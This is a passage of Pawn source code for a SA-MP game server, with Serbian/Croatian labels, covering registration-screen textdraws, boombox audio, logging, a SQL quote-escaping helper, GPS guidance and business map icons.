        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][12], 331.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][12], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][12], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][12], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][12], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][12], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][12], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][12], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][12], 1);

        RegisterTD[playerid][13] = CreatePlayerTextDraw(playerid, 320.967193, 152.600067, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][13], 0.000000, -0.150000);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][13], 321.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][13], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][13], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][13], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][13], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][13], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][13], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][13], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][13], 1);

        RegisterTD[playerid][14] = CreatePlayerTextDraw(playerid, 209.000000, 231.425018, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][14], 0.000000, -0.352999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][14], 432.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][14], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][14], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][14], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][14], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][14], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][14], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][14], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][14], 1);

        RegisterTD[playerid][15] = CreatePlayerTextDraw(playerid, 208.166687, 271.593963, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][15], 0.000000, -0.352999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][15], 434.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][15], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][15], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][15], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][15], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][15], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][15], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][15], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][15], 1);

        RegisterTD[playerid][16] = CreatePlayerTextDraw(playerid, 206.500000, 184.312500, "L_O_Z_I_N_K_A");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][16], 0.174998, 0.593750);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][16], 250.000000, 10.000000); // 581.000000, 10.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][16], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][16], -1061109505);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][16], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][16], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][16], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][16], 1);
        PlayerTextDrawSetSelectable(playerid, RegisterTD[playerid][16], true);

        RegisterTD[playerid][17] = CreatePlayerTextDraw(playerid, 325.500000, 185.187500, "RADI_SIGURNOSTI_KORISTITE_JACU_LOZINKU.");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][17], 0.125000, 0.488750);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][17], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][17], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][17], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][17], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][17], 2);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][17], 1);

        RegisterTD[playerid][18] = CreatePlayerTextDraw(playerid, 206.500000, 204.437500, "M_A_I_L");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][18], 0.174998, 0.593750);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][18], 250.000000, 10.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][18], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][18], -1061109505);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][18], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][18], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][18], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][18], 1);
        PlayerTextDrawSetSelectable(playerid, RegisterTD[playerid][18], true);

        RegisterTD[playerid][19] = CreatePlayerTextDraw(playerid, 206.500000, 223.250000, "G_O_D_I_N_E");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][19], 0.174998, 0.593750);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][19], 250.000000, 10.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][19], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][19], -1061109505);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][19], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][19], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][19], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][19], 1);
        PlayerTextDrawSetSelectable(playerid, RegisterTD[playerid][19], true);

        RegisterTD[playerid][20] = CreatePlayerTextDraw(playerid, 206.500000, 242.937500, "P_O_L");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][20], 0.174998, 0.593750);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][20], 250.000000, 10.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][20], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][20], -1061109505);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][20], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][20], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][20], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][20], 1);
        PlayerTextDrawSetSelectable(playerid, RegisterTD[playerid][20], true);

        RegisterTD[playerid][21] = CreatePlayerTextDraw(playerid, 206.500000, 263.500000, "P_O_R_E_K_L_O");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][21], 0.174998, 0.593750);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][21], 250.000000, 10.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][21], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][21], -1061109505);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][21], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][21], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][21], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][21], 1);
        PlayerTextDrawSetSelectable(playerid, RegisterTD[playerid][21], true);

        RegisterTD[playerid][22] = CreatePlayerTextDraw(playerid, 376.500000, 204.875000, "KORISTITE_PRAVI_MAIL.");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][22], 0.126000, 0.484375);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][22], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][22], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][22], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][22], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][22], 2);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][22], 1);

        RegisterTD[playerid][23] = CreatePlayerTextDraw(playerid, 376.500000, 224.125000, "UNESITE_VASE_GODINE.");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][23], 0.126000, 0.484375);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][23], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][23], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][23], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][23], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][23], 2);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][23], 1);

        RegisterTD[playerid][24] = CreatePlayerTextDraw(playerid, 390.000000, 243.812500, "ODABERITE_SPOL.");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][24], 0.126000, 0.484375);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][24], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][24], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][24], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][24], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][24], 2);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][24], 1);

        RegisterTD[playerid][25] = CreatePlayerTextDraw(playerid, 367.500000, 263.937500, "ODABERITE_VASU_DRZAVU.");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][25], 0.126000, 0.484375);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][25], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][25], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][25], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][25], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][25], 2);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][25], 1);

        RegisterTD[playerid][26] = CreatePlayerTextDraw(playerid, 209.000000, 290.050018, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][26], 0.000000, -0.352999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][26], 432.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][26], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][26], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][26], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][26], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][26], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][26], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][26], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][26], 1);

        RegisterTD[playerid][27] = CreatePlayerTextDraw(playerid, 206.500000, 281.437500, "S_K_I_N");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][27], 0.174998, 0.593750);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][27], 250.000000, 10.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][27], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][27], -1061109505);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][27], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][27], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][27], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][27], 1);
        PlayerTextDrawSetSelectable(playerid, RegisterTD[playerid][27], true);

        RegisterTD[playerid][28] = CreatePlayerTextDraw(playerid, 391.500000, 282.312500, "ODABERITE_SKIN.");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][28], 0.126000, 0.484375);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][28], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][28], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][28], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][28], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][28], 2);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][28], 1);

        RegisterTD[playerid][29] = CreatePlayerTextDraw(playerid, 413.749908, 313.585662, "R_E_G_I_S_T_E_R");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][29], 0.208498, 0.773123);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][29], 500.000000, 10.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][29], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][29], -1061109505);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][29], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][29], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][29], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][29], 1);
        PlayerTextDrawSetSelectable(playerid, RegisterTD[playerid][29], true);

        RegisterTD[playerid][30] = CreatePlayerTextDraw(playerid, 207.750000, 251.371704, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][30], 0.000000, -0.352999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][30], 431.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][30], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][30], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][30], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][30], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][30], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][30], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][30], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][30], 1);

        RegisterTD[playerid][31] = CreatePlayerTextDraw(playerid, 208.166671, 211.964218, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][31], 0.000000, -0.352999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][31], 431.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][31], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][31], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][31], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][31], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][31], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][31], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][31], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][31], 1);

        RegisterTD[playerid][32] = CreatePlayerTextDraw(playerid, 207.750000, 192.779006, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][32], 0.000000, -0.352999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][32], 431.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][32], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][32], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][32], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][32], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][32], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][32], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][32], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][32], 1);

        RegisterTD[playerid][33] = CreatePlayerTextDraw(playerid, 207.750000, 289.742065, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][33], 0.000000, -0.436331);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][33], 433.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][33], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][33], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][33], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][33], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][33], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][33], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][33], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][33], 1);

        for( new i = 0; i < 34; i ++) {
			PlayerTextDrawShow( playerid, RegisterTD[ playerid ][ i ] );
		}
	    
	    ShowedRegister[ playerid ] = true;

	}
	else if( show == false ) {
		for( new i = 0; i < 34; i ++) {
			PlayerTextDrawHide( playerid, RegisterTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, RegisterTD[ playerid ][ i ] );
			RegisterTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
		
		ShowedRegister[ playerid ] = false;
	}
}
//------------------------------------------------------------------------------
stock Boombox_Place( playerid ) {
	static
	    Float:angle;

	GetPlayerFacingAngle(playerid, angle);

	strpack(BoomboxInfo[ playerid ][boomboxURL], "", 128 char);
	GetPlayerPos(playerid, BoomboxInfo[ playerid ][ boomboxPos ][ 0], BoomboxInfo[ playerid ][ boomboxPos ][ 1], BoomboxInfo[ playerid ][ boomboxPos ][ 2] );

	BoomboxInfo[ playerid ][boomboxPlaced] = true;
	BoomboxInfo[ playerid ][boomboxInterior] = GetPlayerInterior(playerid);
	BoomboxInfo[ playerid ][boomboxWorld] = GetPlayerVirtualWorld(playerid);
    //new string[ 128 ];
	//format( string, sizeof( string ), "Vlasnik: %s\nKoristi '/radio url' da postavis pesmu\n'/radio podigni' da podignes svoj radio", ImeIgraca( playerid ) );

    new String: string = str_format("Vlasnik: %s\nKoristi '/radio url' da postavis pesmu\n'/radio podigni' da podignes svoj radio", ImeIgraca(playerid));

    BoomboxInfo[ playerid ][boomboxObject] = CreateDynamicObject(2103, BoomboxInfo[ playerid ][ boomboxPos ][ 0], BoomboxInfo[ playerid ][ boomboxPos ][ 1], BoomboxInfo[ playerid ][ boomboxPos ][ 2] - 0.9, 0.0, 0.0, angle, BoomboxInfo[ playerid ][boomboxWorld], BoomboxInfo[ playerid ][boomboxInterior] );
    BoomboxInfo[ playerid ][boomboxText3D] = pp_CreateDynamic3DTextLabel( string, -1, BoomboxInfo[ playerid ][ boomboxPos ][ 0], BoomboxInfo[ playerid ][ boomboxPos ][ 1], BoomboxInfo[ playerid ][ boomboxPos ][ 2] - 0.7, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, BoomboxInfo[ playerid ][boomboxWorld], BoomboxInfo[ playerid ][boomboxInterior] );

	return 1;
}

stock Boombox_Nearest(playerid)
{
	foreach (new i : Player) if(BoomboxInfo[ i ][boomboxPlaced] && GetPlayerInterior(playerid) == BoomboxInfo[ i ][boomboxInterior] && GetPlayerVirtualWorld(playerid) == BoomboxInfo[ i ][boomboxWorld] && IsPlayerInRangeOfPoint(playerid, 30.0, BoomboxInfo[ i ][boomboxPos][0], BoomboxInfo[ i ][boomboxPos][1], BoomboxInfo[ i ][boomboxPos][2 ] ) ) {
     	return i;
	}
	return INVALID_PLAYER_ID;
}

stock Boombox_SetURL(playerid, url[])
{
	if( BoomboxInfo[ playerid ][ boomboxPlaced ] ) {
	    strpack( BoomboxInfo[ playerid ][ boomboxURL ], url, 256 char);

	    foreach (new i : Player) if(Boombox[ i ] == playerid) {
            
			StopAudioStreamForPlayer(i);
			PlayAudioStreamForPlayer(i, url, BoomboxInfo[ playerid ][ boomboxPos ][ 0], BoomboxInfo[ playerid ][ boomboxPos ][ 1], BoomboxInfo[ playerid ][ boomboxPos ][ 2], 30.0, 1);
		}
	}
	return 1;
}

stock Boombox_Destroy(playerid)
{
	if(BoomboxInfo[ playerid ][boomboxPlaced])
	{
		if( IsValidDynamicObject(BoomboxInfo[ playerid ][boomboxObject ] ) )
		    DestroyDynamicObject(BoomboxInfo[ playerid ][boomboxObject] );

		if( IsValidDynamic3DTextLabel(BoomboxInfo[ playerid ][boomboxText3D ] ) )
		    DestroyDynamic3DTextLabel(BoomboxInfo[ playerid ][boomboxText3D] );

		foreach (new i : Player) if(Boombox[ i ] == playerid) {
		    StopAudioStreamForPlayer(i);
		}
        BoomboxInfo[ playerid ][boomboxPlaced] = false;
        BoomboxInfo[ playerid ][boomboxInterior] = 0;
        BoomboxInfo[ playerid ][boomboxWorld] = 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
stock LogSave( gde[], string[]) {

	new entry[ 128 ], s, m, se, day, year, month;
	getdate( year, month, day );
	gettimeEx( s, m, se );
	FixHour( s );
	s = shifthour;
	
	format( entry, sizeof( entry ), "%d/%d/%d | %d/%d/%d | %s\r\n", day, month, year, s, m, se, string );
	new File:hFile;
	hFile = fopen( gde, io_append );
	fwrite( hFile, entry );
	fclose( hFile );
}
//------------------------------------------------------------------------------
stock GetZoneName(Float:x, Float:y, zone[], len) {

	for( new i = 0; i != sizeof(gSAZones); i++ )
	{
		if(x >= gSAZones[ i ][SAZONE_AREA][0] && x <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y >= gSAZones[ i ][SAZONE_AREA][1] && y <= gSAZones[ i ][SAZONE_AREA][4])
		{
			return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return 0;
}

stock escape(text[])
{
	new
		ret[MAX_INI_ENTRY_TEXT * 2],
		ch,
		i,
		j;
	while ((ch = text[i++]) && j < sizeof (ret))
	{
		if(ch == '\'')
		{
			if(j < sizeof (ret) - 2)
			{
				ret[j++] = '\'';
				ret[j++] = '\'';
			}
		}
		else if(j < sizeof (ret))
		{
			ret[j++] = ch;
		}
		else
		{
			j++;
		}
	}
	ret[sizeof (ret) - 1] = '\0';
	return ret;
}

stock Float:PointAngle(playerid, Float:xa, Float:ya, Float:xb, Float:yb)
{
	new Float:carangle;
	new Float:xc, Float:yc;
	new Float:angle;
	xc = floatabs(floatsub(xa,xb));
	yc = floatabs(floatsub(ya,yb));
	if(yc == 0.0 || xc == 0.0)
	{
		if(yc == 0 && xc > 0) angle = 0.0;
		else if(yc == 0 && xc < 0) angle = 180.0;
		else if(yc > 0 && xc == 0) angle = 90.0;
		else if(yc < 0 && xc == 0) angle = 270.0;
		else if(yc == 0 && xc == 0) angle = 0.0;
	}
	else
	{
		angle = atan(xc/yc);
		if(xb > xa && yb <= ya) angle += 90.0;
		else if(xb <= xa && yb < ya) angle = floatsub(90.0, angle);
		else if(xb < xa && yb >= ya) angle -= 90.0;
		else if(xb >= xa && yb > ya) angle = floatsub(270.0, angle);
	}
	GetVehicleZAngle(GetPlayerVehicleID(playerid), carangle);
	return floatadd(angle, -carangle);
}

stock setPlayerGps(playerid, Float:x, Float:y, Float:z) {

	if( IsValidDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId ] ) ) {
		DestroyDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId] );
	}

    PlayerGpsRadar[ playerid ][_pgrPos][0] = x;
    PlayerGpsRadar[ playerid ][_pgrPos][1] = y;
    PlayerGpsRadar[ playerid ][_pgrPos][2] = z;
    PlayerGpsRadar[ playerid ][_pgrIconId] = CreateDynamicMapIcon(x, y, z, 0, CRVENA, -1, -1, playerid, 6000.0, MAPICON_GLOBAL);

    SetTimerEx("UpdatePlayerGps", 100, false, "dd", playerid, 1);

    if( IsPlayerInAnyVehicle( playerid ) ) {

        if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) {
			DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
		}

	    new Float:VPos[ 3 ], Float:Rotation;

        PlayerGpsRadar[ playerid ][ _pgrObject ] = CreateDynamicObject(19133, 0, 0, 1100, 0.0, 0.0, 0.0);

	 	GetVehiclePos( GetPlayerVehicleID( playerid ), VPos[ 0 ], VPos[ 1 ], VPos[ 2 ] );
	 	Rotation = PointAngle( playerid, VPos[ 0 ], VPos[ 1 ], x, y );
		AttachDynamicObjectToVehicle( PlayerGpsRadar[ playerid ][ _pgrObject ], GetPlayerVehicleID( playerid ), 0.0, 0.0, 1.5, 0.0, 90.0, Rotation );
	}
}
//------------------------------------------------------------------------------

CreateMapIcons( ) {
    for( new i = 1;i < MAX_BUSSINES; i++ ) {
		if( BussinesInfo[ i ][ bType ] == VRSTA_BINCO || BussinesInfo[ i ][ bType ] == VRSTA_SUBURBAN || BussinesInfo[ i ][ bType ] == VRSTA_ZIP || BussinesInfo[ i ][ bType ] == VRSTA_VICTIM ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 45, BELA, -1, -1, -1, 300.0 );
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_BURG ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 10, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_CLUCK ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 14, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_PIZZA ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 29, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_GYM ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 54, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_GUNSHOP ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 6, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_BAR ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 49, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_RESTORAN ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 50, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_NKLUB || BussinesInfo[ i ][ bType ] == VRSTA_DISCO ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 48, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_MARKET ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 56, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_ELEKTRONIK ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 23, BELA, -1, -1, -1, 300.0);
		}
		if( BussinesInfo[ i ][ bType ] == VRSTA_TRAFIKA ) {
		    CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 42, BELA, -1, -1, -1, 300.0);
		}
        if( BussinesInfo[ i ][ bType ] == VRSTA_CASINO ) {
            CreateDynamicMapIcon( BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ], 25, BELA, -1, -1, -1, 300.0);
        }
	}
	// // School
 //    CreateDynamicMapIcon( 1207.3988, -1439.3783, 13.3828, 38 , BELA, -1, -1, -1, 300.0);

 //    // Furniture
 //    CreateDynamicMapIcon( 1004.7539, -1610.4541, 14.5139, 57, BELA, -1, -1, -1, 300.0);

 //    // Hospitals
 //    CreateDynamicMapIcon( 1172.9071, -1323.4137, 15.3990, 22, BELA, -1, -1, -1, 300.0);
 //    CreateDynamicMapIcon( 2034.0184, -1402.6791, 17.2933, 22, BELA, -1, -1, -1, 300.0);

	// Police
	CreateDynamicMapIcon( 1144.3706,-1360.5538,13.6996, 30, BELA, -1, -1, -1, 300.0);

	// Mod Shops
	CreateDynamicMapIcon( 1041.1241, -1026.3285, 32.1016, 27, BELA, -1, -1, -1, 300.0);
	CreateDynamicMapIcon( 2644.8325, -2038.8018, 13.5500, 27, BELA, -1, -1, -1, 300.0);
	CreateDynamicMapIcon( -1935.7455, 238.4695, 34.3125, 27, BELA, -1, -1, -1, 300.0);
